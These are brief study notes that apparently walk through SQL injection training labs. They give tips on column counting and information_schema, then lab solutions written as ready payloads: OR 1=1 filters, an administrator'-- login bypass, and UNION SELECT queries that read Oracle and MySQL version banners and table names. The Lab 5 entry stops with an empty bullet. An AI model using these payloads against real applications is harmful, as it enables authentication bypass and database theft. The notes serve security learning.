## How to:

1. To test the DB: Use `DUAL` Table in Oracle.
2. Can perform SQLI without Union:
  - Manipulating WHERE clauses.
  - Commenting out the remaining query
  - Subqueries
3. To Test SQLi: 1st Determine the Column Numbers > 
> Union merge the query in the Existing query.
- <img width="300" alt="image" src="https://github.com/IOxCyber/EssentialsCy/assets/40174034/bd9e2d73-516e-4903-995d-871992768e89">
4. This table always exists: `information_schema.tables`, can be used to retrive the table_names, table_columns etc



## Solution:
- Lab 1: Retrieval of Hidden Data(Where): `Modify the category parameter, giving it the value '+OR+1=1--`
- Lab 2: SQL injection vulnerability allowing login bypass: `Modify the username parameter, giving it the value: administrator'--` or `enter ' OR 1=1-- in username & pwd field`
- Lab 3: Querying the database type and version on Oracle:
    - Verify the `number of columns` that are being returned by the query and which columns contain text data `'Union+SELECT+'NULL','NULL'+FROM+DUAL--`
    - Add the Payload in URL `'UNION+SELECT+banner,NULL+FROM+v$version--`

- Lab 4: Querying the database type and version on MySQL and Microsoft:
    - Verify the `number of columns` that are being returned by the query and which columns contain text data `'Union+SELECT+NULL+NULL#`,`# to Comment out in MySQL`
    - Add the Payload in URL 'Union+SELECT+@@version,NULL#

- Lab 5: listing the database contents on non-Oracle databases:
    - To know the table name `'Union+Select+table_name,NULL+FROM+information_schema.tables--`
    - 












